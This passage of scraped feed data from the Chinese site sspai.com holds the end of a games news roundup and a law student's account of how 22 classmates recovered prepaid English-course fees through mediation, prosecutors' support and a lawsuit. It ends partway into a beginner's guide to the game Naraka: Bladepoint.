href=\"https://twitter.com/baldursgate3/status/1410617427713429504\">🔗</a>\n</li>\n<li>《Apex 英雄》被黑导致无法游玩任何模式，游戏中挂上了指向网站 <a href=\"https://savetitanfall.com/\">SaveTitanfall.com</a> 的通告并要求 Respawn 工作室解决《泰坦天降》初代无法游玩的问题。然而网站却声称与这次黑客事件无关。 <a href=\"https://www.pcgamer.com/apex-legends-hacked-to-protest-titanfalls-server-situation/\">🔗</a>\n</li>\n<li>《GTA》系列的创造者，Rockstar Games 的联合创始人 Dan Houser 成立了一家名叫 Absurd Ventures in Games 的新公司。47 岁的 Dan Houser 在 1998 年与兄弟 Sam Houser 共同创办了 Rockstar Games，并于 2020 年 2 月辞职。 <a href=\"https://www.polygon.com/22560658/dan-houser-new-company-rockstar-games-founder\">🔗</a>\n</li>\n<li>《对马岛之鬼 导演剪辑版》（Ghost of Tsushima : Director's Cut） PS4 / PS5 版将于 8 月 20 日发行，官方发布了游戏预告片（<a href=\"https://www.youtube.com/watch?v=3nCWCgF4jA0\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1MU4y1V7Wa\">哔哩哔哩</a>）。内含新地图「壹岐岛」，支持 4K + 60 fps，新增日语口形，PS5 版支持自适应扳机和触觉反馈。老玩家需<strong>付费升级</strong>，其中 PS4 原版需花费高达 29.99 美元升级到 PS5 导演剪辑版。 <a href=\"https://blog.playstation.com/2021/07/01/ghost-of-tsushima-directors-cut-arrives-on-ps5-and-ps4-consoles-on-august-20/\">🔗</a>\n</li>\n<li>《毁灭战士：永恒》（Doom: Eternal）现已提供 PS5 和 Xbox Series X|S 的次世代版升级，并且是<strong>免费</strong>的。 <a href=\"https://www.polygon.com/22557388/doom-eternal-free-upgrade-ps5-xbox-series-x-release-date\">🔗</a>\n</li>\n<li>《瘟疫传说：无罪》（A Plague Tale：Innocence）现已提供 PS5 和 Xbox Series X|S 的次世代版升级，并且是<strong>免费</strong>的。就连游戏本身对某些玩家也是免费的，玩家可以通过本月的 PS+ 会免或 XGP 库体验到这款游戏。 <a href=\"https://gamingbolt.com/a-plague-tale-innocences-ps5-xbox-series-x-s-update-is-now-live\">🔗</a>\n</li>\n<li>经典塔防游戏《王国守卫战》（Kingdom Rush）系列的开发商 Ironhide 工作室公布了全新的废土风格塔防游戏《Junkworld》（预告片：<a href=\"https://www.youtube.com/watch?v=eiKBfdDmg70\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1U54y1J7BT\">哔哩哔哩</a>），并且游戏已经在 Google Play 开启了预注册。 <a href=\"https://twitter.com/ironhidegames/status/1410599563707129866\">🔗</a>\n</li>\n</ul> <h2>彩蛋</h2>\n<h3>🌈🥚1 《我的世界》官方加入了文言文翻译</h3>\n<p>感谢少数派的 @<a href=\"https://sspai.com/u/aping/updates\" target=\"_blank\">揽件阿平</a> 贡献了本条彩蛋素材。来源：<a href=\"https://m.weibo.cn/status/4654179883158381\">微博 米芋厨</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/037240deb3b83c99c6c184f5ef039522.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/f1d0adc91f8c7c80a49bb4ae07bfb2cb.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/b0efa6721e512a985074046873c1ae3e.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/724fddc9f44dc2bec6c1ffce0bb47003.jpg\"></figure><h3>🌈🥚2 育碧官方发布了中文视频《踏入 UBISOFT 职场：Amandine 的奇幻之旅》</h3>\n<p>在这个视频中，Amandine 分享了在育碧当游戏设计师是一种怎样的体验。</p>\n<p><a href=\"https://www.youtube.com/watch?v=8CasgWVhN-k\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1sv411H7CZ\">哔哩哔哩</a></p> <h3>🌈🥚3 游戏《空手道》（Karateka）隐藏了 37 年的彩蛋</h3>\n<p>当玩家在 Apple II 机器中反过来插入游戏磁盘，那么从标题直到游戏中的画面都将反过来展示。这个看似简单的彩蛋，实际需要编写大量的代码才能实现。从中我们可以看到早年间游戏开发者独特的幽默感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/e655899ed61ef2a814a135d6c451123d.png\"><figcaption>彩蛋演示视频截图</figcaption></figure><p>彩蛋演示视频：<a href=\"https://www.youtube.com/watch?v=4WNYrikbtcY\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1KB4y1N7Pv/\">哔哩哔哩</a></p> <h3>🌈🥚4 JulioNIB 推出了《GTA V》的「哥斯拉与机械哥斯拉」MOD</h3>\n<p>你可以在作者的 <a href=\"http://gtaxscripting.blogspot.com/\">博客</a> 查看这个 MOD 的更多信息。目前这个 MOD 的预发行版本需要通过 <a href=\"https://www.patreon.com/posts/53077436\">Patreon</a> 付费下载，但作者会在更晚的时候提供免费的最终版本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/36559b89eb503484fa6ade6f51fe57cd.gif\"></figure><p>MOD 演示视频：<a href=\"https://www.youtube.com/watch?v=2H9jYUqGiME\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV14V411W7oA/\">哔哩哔哩</a></p> <h3>🌈🥚5 玩家 kvelyognaut 自制了《黑暗之魂》的 3D 版地图动态轨迹</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/cf32529524cb7749504fc68e00880be3.gif\"></figure><p>作者的游玩过程动态轨迹视频：<a href=\"https://www.youtube.com/watch?v=3Vt8WuTZHOk\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1rB4y1T7QT/\">哔哩哔哩</a></p> <p>你还可以在 <a href=\"https://github.com/Kvel2D/ds-playthrough-map\">Github</a> 找到作者开源的代码，并使用自己的游戏数据生成动态轨迹。</p>\n<h2>游戏音乐推荐</h2>\n<h3>One more thing…</h3>\n<p>受到少数派文章《<a href=\"https://sspai.com/post/67020\">打破第四面墙的桥梁，我与游戏的音乐记忆</a>》的启发，我决定在每期末尾推荐一首游戏音乐，有点「片尾曲」的意思。知道了这个套路的读者以后也可以直接划到底部，边听音乐边看文章（所以以后是不是应该放到文章开头？）。也许会有人因为音乐从而对游戏产生兴趣（我就是）。</p>\n<p>欢迎读者们在评论中推荐更多优秀的游戏音乐，并附上收听链接，我将会在后续的游戏周报中分享。</p>\n<h3>Whirling​-​In​-​Rags, 8am - British Sea Power</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/95059a850e87cee6be76abbb961a7523.jpg\"></figure><p>本期推荐的音乐是来自游戏《极乐迪斯科》（Disco Elysium）中的一首《Whirling​-​In​-​Rags, 8am》，来自音乐人 British Sea Power。</p>\n<p>你可以在 <a href=\"https://britishseapower.bandcamp.com/track/whirling-in-rags-8am\">Bandcamp</a> 上免费收听这首音乐，或者在你喜爱的音乐服务中按名称搜索。</p>\n<p>由于我不知道如何在页面上嵌入在线播放音乐的控件，下面用这首音乐的 B 站视频代替：</p> <p>📧 纠错/反馈/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67591"},{"title":"学英语遭遇「跑路」：22 位大学生、3 步成功维权","date":"2021-07-09 03:51:07","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>作者简介：李孟超，青岛某高校法学院大三在读，武大学硕备考中。曾入围「小城杯公益诉讼大赛」复赛。</p>\n<h2>一、维权背景：我要学英语</h2>\n<p>相信很多同学都和我一样，认为大学生活总得给自己找点除了按时上课之外的事情做。在 2018 年，我通过一场宣讲会了解到某英语培训机构。这家英语培训机构主打沉浸式英语学习课程，包括电影课、阅读课、西方文化课等一系列通过英语口语教授的课程。课程一共分为六个级别，老师在跟学生推销课程时会让学生做一个测试，看学生的英语水平处在哪一个级别，然后根据学生的个人意愿，自行选择提升多少个级别。</p>\n<p>本人高考英语 135，自信满满做了测试，结果测试水平只达到了 Level 2，还有 4 个级别的提升空间。当时也不知道是自己真的想要学好英语还是单纯受了销售人员的蛊惑，花了两万块报名了 4 个等级的提升课程。事实证明（包括我后期和这些销售老师进行了沟通以及去其他的培训机构了解他们所谓的销售话术），原来我并不是有多爱学习，其实就是受了他们的蛊惑。</p>\n<p>他们的推销确实很有煽动性，但是实际的教学质量以及老师课后的督促效果也并没有达到当时所说的效果，就好像是春晚那个买保健品的小品，一个普普通通甚至质量差到能蹦弹簧的床垫子，经过一番话术后，就变成了神乎其神的保健品。当时我还觉得这种推销很可笑，没想到这样的话术我也会碰到，只不过保健品变成了英语课，长命百岁的愿望被替换成了学好英语的心理。</p>\n<p>事已至此，我心想就当买个教训了，但是，麻烦事却远不止于此。</p>\n<p>因为去年的疫情，所有人无法返校，这种沉浸式的学习模式也改成了线上模式，学习效果自然是大打折扣。虽然大家反映过几次问题，但也没多说什么，毕竟是因为疫情不能返校嘛，我们都可以理解。</p>\n<p>开学之后，我去找老师问秋季学期什么时候开课。过了几天老师就在课程群要求我们发各自的课表，并且表示近几天就能开课，但没有提到具体的上课方式。我就接着去问，这学期总该恢复线下授课了吧。结果老师回复道，还是继续线上课。我心想这不是开玩笑嘛，没有了线下这种沉浸式的英语学习环境，还提升什么英语能力。当我把这个消息告诉给别的同学时，他们也比较懵圈，都说以为是线下授课，所以有的同学已经把自己的课表给发了出去。</p>\n<p>一旦机构那边收到了同学的课表，定了时间开课，我们要是不去上就会理亏，以后也不好再去协商。所以我就建议同学先不要发课表，已经发了的话，能撤回就撤回，不能撤回的就说发错了课表。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/2deb5ddb3ef902b1eee16ed82359a233.png\"></figure><p>当我挨个去找同学告知他们上课方式时，我才发现大家其实有很多想吐槽的，比如机构老师不回消息、课程质量变差等问题。但群里有老师，说话不方便，于是我们建了一个小群，有同学发了机构所在地人去楼空的照片，我心想这完了，不会跑路了吧。微信发消息爱答不理，机构所在地人去楼空。同学们都很担心，担心既开不了课，又拿不回课程费用。</p>\n<p>到了这种境地，我觉得我们这些花了钱的穷大学生应该见面聊聊，商量接下来应该怎么办。见面之后，本来不是很熟悉的我们因为对同一个机构的吐槽和不满，聊得热火朝天。我们既知道他们喜欢和稀泥，又害怕他们会跑路，所以一时半会也没想出什么主意。因为是我召集大家的，自觉有责任提供点建议供大家选择。我说咱们线上找老师沟通，你看他们的回复像是有一个沟通的态度吗？线上说不清楚，大家看就由我和张立龙（另一位同学）去把老师约出来，表达一下咱们的诉求，看他们是否给我们解决问题。</p>\n<p>「如果他们不解决怎么办？」碰面的几个同学问。</p>\n<p>我也不知道怎么办，心里没底，不过这个时候只能给大家打气：「如果不行的话，咱们就起诉他。先好好和他商量，谈不成就走法律这条路。」</p>\n<p>「走法律这条路能行吗？咱们的胜算几率大吗？」</p>\n<p>「你想啊，咱们当时签订的合同，他都不给咱们上课了，你说是谁的问题?当然是他们的问题了，我看咱们赢的机会还是比较大的。」</p>\n<p>我当时想的是「维权三步走」策略（其实就是《消保法》提倡的<strong>协商、调解、诉讼</strong>这三个步骤），我们后来确实也是这样做的。《三国演义》里面说，将士冲锋之前总会有一段诸如杀身报国、功成名就之类的演说，虽然维权没有上阵杀敌那么壮烈，但当时我也装模作样说了这么一段：「大家苦此培训机构久矣，单兵多次反映问题无果，不得已而聚于此地，仅希望作为大学生的各位能团结一致，如协商不成，我们可以走法律途径，虽然我是个法学小白（当时还在上大二），但是我们法学院的老师都很厉害，实在不行也可以请他们给予帮助，容我先按照这三个步骤试一试。」 当时我说完这段话，觉得挺热血的，虽然知道维权不易，但真没想到用了这么长时间和这么多方式。</p>\n<p>接下来我就按照上述的三个步骤介绍维权经过。</p>\n<h2>二、维权经过：从协商到诉讼</h2>\n<h3>协商</h3>\n<p>散会之后，我和另一位张同学就准备约见教学主管老师，老师说自己最近有事，没时间。我们说了好几个时间她都说没空，她这肯定是在推脱。所以我就挑明了：我俩是代表班里的同学来的，大家对这个上课模式已经不满很长时间了，所以才会来找你。说到最后她才勉强答应过来。</p>\n<p>那个周日的晚上，我们见面了，就在我们学校的 KFC。本来就是协商，也不需要争吵。我们俩就开门见山地表达了恢复开设线下课程、如不恢复课程便退还剩余课程费用等诉求。这个课程主管老师态度也比较客气，但是一直在打太极，说好多情况她都不知道，得回去落实。至于线下上课她倒是提出了一个看起来可行但是却于事无补的解决方案：租借我们学校的教室给我们上课。可以倒是可以，我也可以去联系教室，但学校里的教室以及环境怎么能比得上赶不上培训机构的设施环境呢。我做不了主，只能说回去问问同学的意见。我们让她对其他问题给个确切的回复时间，她也答应了。</p>\n<p>聊完之后我们就把协商的内容通知给群里的其他同学。</p>\n<p>「来学校上课的问题就在于同学们是分散在大学的两个校区，到底是哪边迁就哪边呢？另外，课程质量怎么保证？」</p>\n<p>群里的这些回复表明同学们不同意这些敷衍了事的解决方案。</p>\n<p>过了一段时间，课程群里的课程主管发言了，说了一大堆话，主旨就是他们机构没有责任，都是疫情原因，所以不能恢复线下课；另外签的合同已经明确规定不能退费，所以只能接着进行线上教学。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/177654fb8802371a0875a97fd4c13447.png\"><figcaption>所谓的微课都是每节十几分钟的视频水课</figcaption></figure><p>我前面已经提到，我们当地的教体局在 2020 年 6 月份便准许校外培训机构开课，所以培训机构主张因为疫情（不可抗力）不能开课是不成立的。另外，我们当时签订的合同有约定不能退款，说的是因为学生的原因才不能退款。那么现在是培训机构变更合同的履行方式，所以这并不是不能退款的情形。</p>\n<p>再退一步说，这种班级课程又不是高大上的一对一私人订制，就算是因为学生的个人原因而要求退费，也应当是可以的。所以这个禁止退费的条款也应当属于排除学生权利的格式条款，应当是无效的。最后这个课程主管还说：「你们愿意起诉就起诉吧，我们最坏的打算是申请破产保护，反正现在这个机构已经没钱了。」</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/48ef1ba4e4624c5c008211fbff2e288b.png\"></figure><p>这句话可真把我逗笑了。她意思就是，哎我懂法律，我知道我作为股东只承担有限责任，所以我不怕你告我，这就是典型的地痞无赖作风。</p>\n<p>我的一位老师曾说过这么一句话：「不懂法不可怕，因为不懂法的人知道自己几斤几两，如果遇到法律问题一般会很虔诚地去请律师等专业的人咨询，那什么样的人可怕呢？就怕学的法律知识一瓶子不满半瓶子晃荡，这样的人迷之自信。」遇上这种人不用法律制裁都对不起她自以为是地钻法律漏洞的行为，我必须治治她。</p>\n<p>我当时正在修《破产法专题》这门课程：《企业破产法》第 35 条规定，「<strong>人民法院受理破产申请后，债务人的出资人尚未完全履行出资义务的，管理人应当要求该出资人缴纳所认缴的出资，而不受出资期限的限制。</strong>」学习这一条时，我打开天眼查，发现这家培训机构的大股东实际缴纳的出资只有 20 万，另有 80 万还没实际缴纳。如果像那位「课程主管」说的那样，他们要申请破产保护的话，那我也不怕他们，破产应当缴纳的认缴出资也足够退款的了。</p>\n<p>看完这一条，我以为找到了制裁她的法律，但当我把想法反映给课程老师时，老师提出了很现实的问题：破产程序周期长，不确定性大，就算最后判股东加速缴纳出资，但如果股东没钱怎么办，破产费用谁出呢？</p>\n<p>唉，用这条法规制裁不了她，好伤心。</p>\n<p>既然课程主管把话说到这个份上，协商算是走不成了，那接下来就走调解。</p>\n<h3>调解</h3>\n<p>调解去找哪个部门也是个问题。我当时认为我们这个合同属于消费服务合同，应该找消费者协会。所以我就拨通了 12315，而我不知道我们当地的 12315 并入到 12345（政务热线）。根据 12345 的处理规则，他应当是把我们的案子指派到相关职权部门。起初是指派到了教体局，教体局说我们这个培训机构实质上没有资质办学，所以不属于他们管理。一波三折，我们最后通过政务公开电话找到了负有职责的市场监管所。</p>\n<p>有市场监管所那么肯定会有该机构的登记，有登记就有负责人的电话号码，监管所就能帮我们联系调解。监管所的工作人员听完我的描述，也挺同情我们，当即联系了机构负责人，不一会工作人员就打电话告诉我说，他批评了负责人不积极处理纠纷的态度，并把我的电话号码留给了机构负责人，负责人表示一会就主动联系我协商解决。</p>\n<p>我很惊讶能得到这样的答复，负责人前面一直不露面，市场监管所的一个电话就能让她回心转意来跟我们协商吗？果不其然，我等了一天都没等到她的电话。我想到后面还那么多同学在等待结果，就心想要不我就给她打电话吧。没想到我一连打了六七个电话，有的长时间无人接听，有的干脆就被挂断。当我反映给监管所时，那边也说电话直接被挂断了。工作人员说他们也没办法了，建议我通过法律来解决问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/dd7b7b6426f39f6f2aedae8d6d0a818e.png\"></figure><p>走到这里，已经一个月了，兜兜转转又来到了我既熟悉又陌生的法律。这时有人向我建议，你解决这个问题别采取横向手段，要纵向解决。我不太明白，问了以后才知道，他是想让我一个人去联系退回自己的钱，带上这么多同学，这不就是让对方觉得你想把事情闹大吗，怎么还会退你钱呢？</p>\n<p>但我不同意这种观点——第一，我们已经做出了很多让步，包括说剩余课程的钱款也可以相应减少一些，然而培训机构的态度始终强硬，不愿意协商；第二，我们说好了要团结，这还没开始走法律途径呢，我要是做出这种事，不说别人，就说其他 21 位同学怎么看我们法学生？ 所以我谢绝了他的好意。</p>\n<h3>法律程序</h3>\n<p>行政主管部门的调解不奏效，最终还是来到了最后一步。我当时觉得诉讼起诉，尤其是 22 位同学一同起诉并不是件易事，所以我从一开始就没打算借一人之力到法院起诉。</p>\n<p>我当时有想过借助老师的力量去诉讼，不过怕麻烦老师就没开口。有没有哪种职业的职责就是帮助我们这些弱势群体（以大部分学生的收入以及社会阅历来看）的？然后我想到了之前听实务课堂（我们学院的特色课程），检察官分享过公益诉讼案件，检察官就在课堂上鼓励我们要善于发现身边的检察线索，积极向检察院提供线索。就这样，我抱着试一试的心态联系到了我们当地的检察院。</p>\n<p>我写了一份情况说明，很快便引起了检察院的重视。不过我们的情况并不符合公益诉讼的条件，接待我的检察官认为我们的情况属于支持起诉的情形，建议我先提交带有大家签名的支持起诉书。</p>\n<p>当我提交部分学生的资料以及申请支持起诉书后，第三天崂山区检察院就联手区教体局、市场监管局成立诉前职能联动小组，想通过诉前调解的方式解决退费问题。当检察官把职能联动小组开会的照片发给我们时，心想终于有人愿意回应我们的诉求了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/99ac4065b5e038f3c8f25a0c264be7f1.png\"><figcaption>后来检察院做的推送，我就不打码了</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/64bdec2302be5513becf41bffe8c132d.png\"></figure><p>检察院和职能部门积极准备调解和诉讼的事宜。而我则去负责收集整理维权学生的证据资料以及发动同学寻找其他的维权学生。在这个过程中，我发现有很多同学的法律以及维权意识还是比较薄弱的，比如<strong>签约之前不会去看这家机构有没有具备培训资质、不会仔细查看合同的限制性条款以及因为怕麻烦而不愿意维权。</strong></p>\n<p>说到这呢，我就举个例子，这位同学是我之前在教培机构认识的。因为刚开始维权的人比较少，我就挨个去找可能存在退费问题的学生，所以当时就找到他了。我说，你看机构现在都不能给我们恢复线下上课，课程质量根本没法保证。他说这么个机构没倒闭还能进行线上课就算好的了。我一想，说得也是。然后我又说，那机构没能力提供线下课，总该退还剩余的课程费用吧？这位同学回答道，哪个机构不想留住人，接着赚这些钱，谁想这么轻易的就把客户放走？我一想，也有道理。我又说，那不退还费用，这个机构负责人总该跟同学好好商量一下吧。然后这位同学说，公司老板都这样，哪个不是态度差，还想多扣点钱的。</p>\n<p>他说到这里，我就觉得，这个同学要么是家里有矿，不在乎这几千块钱，要么就是英语机构的股东。热脸贴着冷屁股，我何苦？所以我就不聊了。不过等到后来他得知检察院要支持起诉时又来找我，想一起加入维权。我说行，前提是你得保证以后不当这样黑心的老板。</p>\n<p>虽然接下来检察院和职能部门做了很多努力，积极调解，但是这个机构负责人就是不联系我们，拒不配合。十多天就这样过去了，最后我们放弃了调解，准备起诉。</p>\n<p>检察院考虑到支持起诉的救助内容有限，于是做了一个创新试点，就是将检察院的支持起诉职能与司法局的法律援助职能衔接起来。在检察院的协调下，市法律援助中心为我们学生指派了两位公益律师。在这个阶段里，我负责和律师对接，准备律师所需要的证据材料，并把每个同学的情况向律师说明。我们很顺利地到律所签订了代理合同和授权委托书，考虑到我们 22 名学生的课业比较繁重，所以当时签的是全权代理。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/ea1da9fa68e47257097fd5a7345cf3a9.png\"></figure><p>签约后，我和法学院的朋友一起到律所帮助立案，我们 4 个人用了一整天才将 22 个同学的网上立案材料准备完毕。立案过程中，律师和我们分享了分享他们的诉讼思路。律师认为，培训机构在无培训资质的情况下提供授课服务，违反了法律、行政法规的强制性规定，所以合同理应属于无效合同，培训机构应当退回所有费用。而根据检索的相关案例来看，法院一般会支持退还剩余课程费用。至于之前提供的培训课程，法院会酌情判赔一小部分。案子赢的几率很大，但就怕赢了官司却拿不到钱。最后在诉前保全程序中，我们成功地查处了机构负责人的一套房产，胜利的曙光在望。</p>\n<p>就这样我们就开启了等待庭审的模式。收到法院通知，2021 年 1 月 21 号开庭。寒假的时候我正好留在青岛实习，所以正好能以当事人的身份和律师一起去开庭，这是我作为当事人第一次参加庭审，心里还是蛮激动的，而当我看到被告也就是机构负责人时，我的心情就不只有激动了。</p>\n<p>因为被告给我们教过课，在我们眼里她是位讲课蛮有意思的老师，和曾经给你讲过课的老师对簿公堂，我心里是会有些异样感觉的，说不出来是愧疚还是什么，只想着如果这位负责人能尽快把钱退了，我们也就心平气和地做个调解。</p>\n<p>谁成想到了庭审质证环节，这名机构负责人矢口否认她曾经给我们提供过培训服务，对于我们提供的支付宝、微信等转账证明她也均不认可。但是我们的证据，从合同到转账记录，再到聊天记录，都足以形成完整的证据链，所以就算她矢口否认也没用。被告的律师感觉像是临场拉过来的一样，说的话在形式上没有法言法语，内容上显示她并没有认真研究过这个案子。我很想赢是不假，但也期待双方律师能够找到对方的短板进而互相辩驳，但被告方律师太让我失望了，我去给被告代理都比他强。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/371ea108220522f0e909d0df83c33382.png\"></figure><p>22 位同学将质证程序挨个走了一遍，用了 5 个小时才把这个环节给搞定，中间甚至有过一次法院下班断电。庭审程序结束后，法官试图做被告的调解工作，我觉得被告根本就没理解我们主张全额返还培训费的目的，她还以为我们是狮子大开头，不想调解。其实我们这仅仅是想要给她施压，敦促她主动来和解。在法官调解的过程中，被告还说我们学生造谣她不退费，给她个人造成了负面影响，这话简直要笑死我。</p>\n<p>当天我们并没有达成调解意见，我看她这个老赖的样子，真担心就算达成调解，她也会说是她可怜我们，想要尽快平息事态才给我们几个钱打发我们，而不是我们应该得到的。如果我们能拿到判决书，诉求能得到法律的认可是再好不过的了。后来法官也来做我们的调解工作，考虑到有 3 个同学的证据并不完整，如果继续死磕，他们 3 个很有可能败诉。所以我们以退还所有同学剩余课程的费用为条件，同意和解。今年的四月份，我们 22 名维权的大学生均拿到了自己的剩余课程费用和民事调解书。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/a0dc82c9bf907062be44d65e09c6edbb.png\"></figure><p>收到欠款后，我们同学带着锦旗和感谢信去检察院和律所表达了谢意，一直陪着我维权的朋友胡明辉把我维权的经历分享给了我们学校的学生权益中心，我还收到了权益中心的邀请，做了一次维权经历分享。</p>\n<p>我们的案子结束了，但是它的影响还在持续。检察院以本案为试点，探索民事支持起诉导入法律援助的新机制；检察院连同市场监管局等部门联合开展完善全区预付费消费机制的工作。</p>\n<p>这便是我历时 6 个月，涉及 22 名大学生，退还费用共计 12 万余元的维权经历。它能有一个比较圆满的结局，离不开身边人的努力——检察官和律师的帮助，老师的建议以及朋友的聆听与鼓励。在此，我诚挚地向你们表达谢意，有你们陪伴的维权我不孤单！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/0ea8cd41c4bcf1c1e36b718af0844f4b.png\"></figure><h2>三、维权感想：下次签合同，千万要留心</h2>\n<h3><strong>报名教培机构一定要慎重</strong></h3>\n<p>教培机构的课程价格都不便宜，所以如果真的需要报名培训，一定要擦亮眼睛。<strong>一是要看机构有无教育培训资质</strong>，没有资质的培训机构，其注册名称往往是「某某教育咨询公司」；<strong>二是要警惕课程销售人员的洗脑话术</strong>，这些销售人员成功签约学员后拿的提成很高，所以推销起来天花乱坠，不能轻信他们的话。要看他们许诺的培训服务，是否在合同里面明确约定了，没明确约定的，基本上都是钓鱼。</p>\n<h3><strong>理性维权</strong></h3>\n<p>维权过程中，有同学出主意，说那个负责人再不还钱就去她家门口堵她，等我看到群里这条消息时，已经有好几个人附和起来了。大家都有气愤的情绪，我也不例外。但在现实中这种行为是很不可取的，因为我们维权一是为了要回钱，二是为了要个说法，也就是公平正义。如果去她家堵她，万一我们情绪激动动了手，不论是道义上还是法律上，都有可能承担相应的责任，得不偿失。</p>\n<h3><strong>集体维权一定要搞好团结</strong></h3>\n<p>最开始的时候要明确大家的诉求，只有统一了大家的诉求，接下来不论是去协商还是去寻求帮助，你说的话才有代表性；遇到一个人解决不了的问题、大家可能听不懂的问题（例如什么是保全担保的限制条件），一定要群策群力，一起商量、解释清楚。</p>\n<h3><strong>要对别人的帮助表达感谢</strong></h3>\n<p>检察院是出于职责支持起诉、律师亦是根据法律援助提供帮助而且能享受补贴，但我们这个案子能得到这几个部门的帮助，我觉得实在是一件很幸运、可遇不可求的事。维权过程里面只要是他们需要的证据我都积极发动同学去找，不让他们在我这里耽误时间；追回课程费用后，我们去定制了锦旗和纪念牌，然后都分别写了感谢信以表示谢意。可能我们这个阶段提供不了律师费用什么的，但是从精神上感谢一下，也能给他们赢得一些社会荣誉。</p>\n<h3><strong>敢于对侵权行为说不</strong></h3>\n<p>前段时间看青苗法鸣推的 iPad 维权文章，甚觉热血，也很钦佩作者张伟伟敢于维权的态度。作者不是法学专业的都这么热血，那咱法科生就是学这个干这个的，那肯定更不能落在后边，所以我也写了下这篇文章同大家分享。我觉得在时间精力允许的条件下，我们都可以和这些侵权行为「碰一碰」，等过了这段青年时光，我们也可以有「到中流击水，浪遏飞舟」的回忆。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67593"},{"title":"新手入坑《永劫无间》需要学会什么？","date":"2021-07-09 03:00:13","description":"\n<p>作为半个新手，给新手最大的建议就是——</p>\n<p><b>趁着现在刚开始，快去多玩玩体验体验吧</b></p>\n<p>可以说在<b>“大家都是初学者”</b>的这个起始阶段，对游戏的体验也应该是最友好的，等到后面很多玩家天赋什么的点满了、练度很高了再去玩，游戏体验落差就会很大了。</p>\n<p>在这里展示一下现在的<b>“游戏体验”</b>:</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b3f4a2969baf5e6aa7b8ee90c07b2848_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"因为预购了妖刀姬，所以现在玩的两把也都在用她\" data-watermark=\"watermark\" data-original-src=\"v2-b3f4a2969baf5e6aa7b8ee90c07b2848\" data-watermark-src=\"v2-423977569e9bcc0bbbd69f097c8d2204\" data-private-watermark-src=\"v2-4b7f4a9257e0b5871f449dfa7b743ed0\"></p>\n<p><br></p>\n<hr>\n<p>好下面我也结合之前玩demo版和今天的官网版来讲一下我自己的个人经验，这些经验应该也是个人认为对新手有所帮助的了:</p>\n<p><b>PS：</b>现在的优化比当时的demo版好很多了</p>\n<p>在玩游戏之前，一定要明白这个游戏的本质：</p>\n<p><b>1.FPS？非FPS?</b></p>\n<p>首先来说一下的武器系统，这也是《永劫无间》和现在其他大逃杀游戏最为不同的点之一：在游戏中<b>近战武器</b>也占有相当的比例，而因为是武侠风，游戏的<b>远程武器</b>也多为箭弩铳炮这类的存在（要考虑下坠了）</p>\n<p>所以说这个游戏给很多不太擅长FPS而喜爱格斗类的玩家创造了机会，尤其常规的远程武器（喷火筒这样的除外）在被人近战黏上的时候也是捉襟见肘，所以在<b>单排</b>期间，即便是擅长FPS的玩家建议也是装配<b>一把近战武器一件远程武器</b>为上。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-95a0e3fd2cea9380c8565bc361775ba6_720w.jpg?rss\" data-rawwidth=\"1751\" data-rawheight=\"819\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-95a0e3fd2cea9380c8565bc361775ba6\" 